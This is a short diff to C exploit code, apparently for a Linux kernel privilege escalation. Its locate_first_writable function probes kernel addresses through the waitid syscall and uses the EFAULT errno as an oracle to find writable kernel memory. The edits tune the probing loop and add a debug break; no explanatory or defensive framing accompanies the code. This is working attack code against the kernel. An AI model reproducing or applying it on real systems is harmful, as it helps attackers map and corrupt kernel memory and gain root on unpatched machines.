@@ -32,14 +32,14 @@ void locate_first_writable() {
 	
 	unsigned long start = 0xffffffff81000000;
 	unsigned long inc =   0x0000000000000010;
-	unsigned long last =   0xfffffffff0000000;
+	unsigned long last =  0xfffffffff0000000;
 
 	unsigned long guess = start;
 	size_t count = 0;
 	size_t w_start = 0;
 	size_t w_end = 0;
 	while (guess != 0) {
-		int res = syscall(SYS_waitid, P_ALL, 0, guess + start_rw_off, WEXITED, NULL);
+		int res = syscall(SYS_waitid, P_ALL, 0, guess, WEXITED, NULL);
 		if (w_start == 0){
 			if(errno != 14){
 				w_start = guess;
@@ -51,15 +51,12 @@ void locate_first_writable() {
 				// guess - inc is the end of the writeable position.
 				printf("[NO.%lu] %p - %p area is writable.\n", count, w_start, (guess - inc));
 				w_start = 0;
+				break;  // todo this is for debug
 			}
 		}
 		guess += inc;
 		if(guess >= last)
 			break;
-
-if(count > 0)
-	break;
-
 	}
 	return;
 }
